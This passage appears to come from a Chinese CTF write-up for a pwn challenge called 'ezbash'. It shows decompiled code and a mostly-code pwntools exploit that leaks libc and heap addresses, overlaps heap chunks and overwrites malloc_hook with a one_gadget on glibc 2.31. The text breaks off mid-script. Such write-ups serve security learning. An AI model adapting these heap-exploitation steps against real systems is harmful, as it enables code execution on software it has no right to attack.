class="keyword">if</span> ( checkfile(destination) )</span><br><span class="line">    &#123;</span><br><span class="line">      copy(copied_file, destination);</span><br><span class="line">      cuurr_pos = curops;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = calloc40();</span><br><span class="line">  ptr-&gt;flag = <span class="number">1</span>;</span><br><span class="line">  copy_name(ptr, comment[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( copied_file-&gt;context )</span><br><span class="line">    copycontext(copied_file, ptr);</span><br><span class="line">  link(cuurr_pos-&gt;firstson, ptr);</span><br><span class="line">  cuurr_pos = curops;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">copy</span><span class="params">(file *src, file *des)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  file *dest; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  dest = des;</span><br><span class="line">  result = src;</span><br><span class="line">  <span class="keyword">if</span> ( src != des &amp;&amp; (src-&gt;context || (result = des-&gt;context) != <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( src-&gt;context || !des-&gt;context )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( src-&gt;context &amp;&amp; des-&gt;context )       <span class="comment">// 文件复制到文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="built_in">strlen</span>(src-&gt;context);</span><br><span class="line">        v5 = <span class="built_in">strlen</span>(des-&gt;context);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          dest = <span class="built_in">realloc</span>(des-&gt;context, v4 + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">memset</span>(dest-&gt;context, <span class="number">0</span>, v4 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memset</span>(des-&gt;context, <span class="number">0</span>, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="built_in">strncpy</span>(dest-&gt;context, src-&gt;context, v4);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 没有context</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = src-&gt;context;</span><br><span class="line">        <span class="keyword">if</span> ( result )</span><br><span class="line">        &#123;</span><br><span class="line">          result = des-&gt;context;</span><br><span class="line">          <span class="keyword">if</span> ( !result )</span><br><span class="line">            result = copycontext(src, des);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(des-&gt;context);</span><br><span class="line">      result = des;</span><br><span class="line">      des-&gt;context = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">copycontext</span><span class="params">(file *src, file *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(src-&gt;context);</span><br><span class="line">  dest-&gt;context = <span class="built_in">malloc</span>(v3);</span><br><span class="line">  <span class="built_in">memset</span>(dest-&gt;context, <span class="number">0</span>, v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncpy</span>(dest-&gt;context, src-&gt;context, v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里 echo 是的我们的 context 大小是固定的，但是这里我们可以 malloc 指定的大小，大小根据我们拷问的文件内容的长度计算。另外一点，cp 不会向目标额外写入空字符。</p>
<h3 id="泄露libc地址"><a class="markdownIt-Anchor" href="#泄露libc地址">#</a> 泄露 libc 地址</h3>
<p>这是一个很无语的过程，因为 echo 的话，一定会清空数据。所以就是利用 cp，把 unsortedbins 的 chunk 申请出来，因为 copycontext 不会清空 chunk。所以我们申请一个 0x8，因为不会写入空字符，就可以把 unsortedbins 申请出来的堆块的前八字节覆盖，到那时保留了 bk 指针，同时也跟前八字节组成新的字符串。这样就泄露了 libc 的地址。为了方便，我们把要拷贝的文件的 context 的 chunksize 写大一点，后面会比较方便。入下面的 cccc 文件，context 的 chunksize=0x551</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">cd(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">touch(<span class="string">b&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3f2</span>,<span class="string">b&quot;BBBB&quot;</span>)</span><br><span class="line">cd(<span class="string">b&quot;../&quot;</span>)</span><br><span class="line">echo(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x3f0</span>,<span class="string">b&quot;cccc&quot;</span>)</span><br><span class="line">echo(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">cp(<span class="string">b&#x27;dddd&#x27;</span>,<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line">cd(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">cat(<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libcbase  = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span> +<span class="number">0x1ff0c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">malloc_hook = libcbase + <span class="number">0x1ecb70</span>-<span class="number">0x23</span></span><br></pre></td></tr></table></figure>
<h3 id="泄露堆地址"><a class="markdownIt-Anchor" href="#泄露堆地址">#</a> 泄露堆地址</h3>
<p>有了上面的思路，泄露堆地址也很容易，glibc2.31 存在 tchche, 拷贝一字节，就可以申请一个 0x20 的 chunk，所以提前布局 2 个 0x20 的 chunk. 申请到的 tache chunk 的 fd 就不为空，我们只需要低位的几个字节就可以，我布局的两个 chunk 很近，我只要覆盖最低字节。然后就泄露了堆地址。值得一提的是，2.31 的 tcache 的 bk 指针指向 tcache，但是申请出来的时候，会自动清空 bk。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak the chunk addr</span></span><br><span class="line">cd(<span class="string">b&#x27;../&#x27;</span>)</span><br><span class="line">mkdir(<span class="string">b&#x27;ii&#x27;</span>)</span><br><span class="line">cp(<span class="string">b&#x27;dddd&#x27;</span>,<span class="string">b&#x27;ii&#x27;</span>)</span><br><span class="line">rmv(<span class="number">0</span>,<span class="string">b&#x27;ii&#x27;</span>)</span><br><span class="line">cd(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">rmv(<span class="number">1</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">cd(<span class="string">b&#x27;../&#x27;</span>)</span><br><span class="line">echo(<span class="string">b&#x27;\x70&#x27;</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">cp(<span class="string">b&#x27;dddd&#x27;</span>,<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">cd(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">cat(<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x001470</span></span><br></pre></td></tr></table></figure>
<h3 id="最后的攻击"><a class="markdownIt-Anchor" href="#最后的攻击">#</a> 最后的攻击</h3>
<p>现在 libc 的地址有了，如何实现任意地址写，因为保护全开，优先考虑了 malloc_hook + onegadget 的攻击</p>
<p>问题来了，如何实现任意地址写？unlink 的攻击无法布局 fakechunk (因为地址只有 6 字节，我们只能写入一个地址)。</p>
<p>基本的攻击手法必要前提在哪里，溢出，UAF,</p>
<p>任意地址写，要么我们拿到任意地址的 fakechunk，要么修改文件的 context 的指针，然后 echo 或者 cp。</p>
<p>我们伪造一个 fakechunk 的可能性不大，所以我们要修改 context 指针。这样的话，没有 uaf，那就考虑 overlap。</p>
<p>关键点来了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( src-&gt;context || !des-&gt;context )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( src-&gt;context &amp;&amp; des-&gt;context )       <span class="comment">// 文件复制到文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="built_in">strlen</span>(src-&gt;context);</span><br><span class="line">        v5 = <span class="built_in">strlen</span>(des-&gt;context);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          dest = <span class="built_in">realloc</span>(des-&gt;context, v4 + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">memset</span>(dest-&gt;context, <span class="number">0</span>, v4 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memset</span>(des-&gt;context, <span class="number">0</span>, v5);</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="built_in">strncpy</span>(dest-&gt;context, src-&gt;context, v4);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                      <span class="comment">// 没有context</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = src-&gt;context;</span><br><span class="line">        <span class="keyword">if</span> ( result )</span><br><span class="line">        &#123;</span><br><span class="line">          result = des-&gt;context;</span><br><span class="line">          <span class="keyword">if</span> ( !result )</span><br><span class="line">            result = copycontext(src, des);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>echo 是检查 chunksize, 这里用 strlen，我们 echo 以及 cp 都不会在末尾强行补一个空字符，如果我们申请的 0x28，那么我们就可以填满 chunk 的用户空间，而且数据会与下一个堆块的 chunksize 来年再一个，只要 v4=v5, 就可以修改 chunksize，把后面的 chunk 包含进去。</p>
<p>我们把文件部署在 actim 后面，0x51 就是我们的文件，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x130</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x120</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x130</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x1</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;mmmm&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;brva 0x01884&#x27;)</span></span><br><span class="line"><span class="comment">#change the chunksize wo achieve overlap</span></span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;\x51\x04&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">mkdir(<span class="string">b&#x27;dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x70</span>,<span class="string">b&#x27;dir&#x27;</span>)</span><br><span class="line">mkdir(<span class="string">b&#x27;dir2&#x27;</span>)</span><br><span class="line">mkdir(<span class="string">b&#x27;dir3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">b&#x27;dir3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook : &quot;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="built_in">print</span>(p64(malloc_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pad = p64(malloc_hook)</span><br><span class="line"><span class="built_in">print</span>(pad[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(pad[<span class="number">5</span>:<span class="number">7</span>])</span><br><span class="line">malloc(<span class="number">0x8</span>,<span class="string">b&#x27;dir2&#x27;</span>,pad[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">dbg()</span><br><span class="line">pad = p64(onegadget)</span><br><span class="line">echo(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x23</span>)+pad[<span class="number">0</span>:<span class="number">6</span>],<span class="string">b&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425154952331.png" alt="image-20220425154952331"></p>
<p>修改后</p>
<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425155032483.png" alt="image-20220425155032483"></p>
<p>你只能写入一个地址，context 在 chunk 的第四个 8 字节位置，我们要向改掉，申请堆块就要拿到 chunk+0x10 的 chunk</p>
<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425155752574.png" alt="image-20220425155752574"></p>
<p>这里就是我们的 5 那个文件。我们目标是申请到她 + 0x10 的 chunk</p>
<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220425160145339.png" alt="image-20220425160145339"></p>
<p>同时我们已经将 malloc_hook-0x23 的地址写到了对应的 context 指针位置，我们下 main 只需要对他进行编辑</p>
<p>这里为甚不直接使用 malloc_hook.cp 里面 strlen 返回的是 0，会进行 realloc，但是不是个合法的 fakechunk，realloc 会报错，echo 也要 chunk 的头部信息，所以布置在 malloc_hook-0x23，这个天然的 fakechunk, 最后 echo 进去，或者 cp 也行</p>
<h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h2>
<p>赛后我们并没有对 exp 进行重新的整理，比较凌乱</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./ezbash&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;140.82.17.215&#x27;,20642)</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezbash&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hacker = <span class="string">&quot;/$ &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">cmd</span>):</span><br><span class="line">	r.sendlineafter(hacker,cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">ptr</span>):</span><br><span class="line">	cmd = <span class="string">b&quot;ls &quot;</span>+ptr</span><br><span class="line">	ch(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">file</span>):</span><br><span class="line">	ch(cmd = <span class="string">b&quot;cat &quot;</span>+file)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cd</span>(<span class="params">addr</span>):</span><br><span class="line">	ch(<span class="string">b&quot;cd &quot;</span>+addr)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">help</span>():</span><br><span class="line">	ch(<span class="string">&quot;help&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">text,filename</span>):</span><br><span class="line">	cmd = <span class="string">b&quot;echo &quot;</span> + text +<span class="string">b&quot; -&gt; &quot;</span>+filename</span><br><span class="line">	ch(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">filename</span>):</span><br><span class="line">	ch(<span class="string">b&quot;touch &quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rmv</span>(<span class="params">flag,filename</span>):</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		cmd = <span class="string">b&quot;rm -r &quot;</span>+filename</span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">		cmd = <span class="string">b&quot;rm &quot;</span>+filename</span><br><span class="line">	ch(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir</span>(<span class="params">filename</span>):</span><br><span class="line">	ch(<span class="string">b&quot;mkdir &quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">	ch(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cp</span>(<span class="params">a,b</span>):</span><br><span class="line">	cmd = <span class="string">b&quot;cp &quot;</span>+a+<span class="string">b&quot; &quot;</span>+b</span><br><span class="line">	ch(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size,ptr,tail=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0</span></span>):</span><br><span class="line">	pad = <span class="string">b&#x27;a&#x27;</span>*size + tail</span><br><span class="line">	echo(pad,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">	cp(<span class="string">b&#x27;cccc&#x27;</span>,ptr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc1</span>(<span class="params">size,ptr,tail=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0</span></span>):</span><br><span class="line">	pad = <span class="string">b&#x27;a&#x27;</span>*size + tail</span><br><span class="line">	echo(pad,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">	cp(<span class="string">b&#x27;a&#x27;</span>,ptr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">ptr</span>):</span><br><span class="line">	cp(<span class="string">b&#x27;free&#x27;</span>,ptr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">cd(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">touch(<span class="string">b&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3f2</span>,<span class="string">b&quot;BBBB&quot;</span>)</span><br><span class="line">cd(<span class="string">b&quot;../&quot;</span>)</span><br><span class="line">echo(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x3f0</span>,<span class="string">b&quot;cccc&quot;</span>)</span><br><span class="line">echo(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">cp(<span class="string">b&#x27;dddd&#x27;</span>,<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line">cd(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">cat(<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">libcbase  = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span> +<span class="number">0x1ff0c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">malloc_hook = libcbase + <span class="number">0x1ecb70</span>-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak the chunk addr</span></span><br><span class="line">cd(<span class="string">b&#x27;../&#x27;</span>)</span><br><span class="line">mkdir(<span class="string">b&#x27;ii&#x27;</span>)</span><br><span class="line">cp(<span class="string">b&#x27;dddd&#x27;</span>,<span class="string">b&#x27;ii&#x27;</span>)</span><br><span class="line">rmv(<span class="number">0</span>,<span class="string">b&#x27;ii&#x27;</span>)</span><br><span class="line">cd(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">rmv(<span class="number">1</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cd(<span class="string">b&#x27;../&#x27;</span>)</span><br><span class="line">echo(<span class="string">b&#x27;\x70&#x27;</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">cp(<span class="string">b&#x27;dddd&#x27;</span>,<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cd(<span class="string">b&quot;AAAA&quot;</span>)</span><br><span class="line">cat(<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x001470</span></span><br><span class="line">fake = heap_addr+<span class="number">0x2800</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_addr : &quot;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="comment">#onegadget = 0xcafebabedeadbeef</span></span><br><span class="line">onegadget = <span class="number">0xe3b31</span>+libcbase</span><br><span class="line">cd(<span class="string">b&#x27;../&#x27;</span>)</span><br><span class="line"></span><br><span class="line">touch(<span class="string">b&quot;free&quot;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;actim&#x27;</span>)</span><br><span class="line">touch(<span class="string">b&#x27;null&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x2a0</span>,<span class="string">b&#x27;nop&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x50</span>,<span class="string">b&#x27;1111&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x110</span>,<span class="string">b&#x27;2222&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#clean the chunk</span></span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">rmv(<span class="number">1</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span 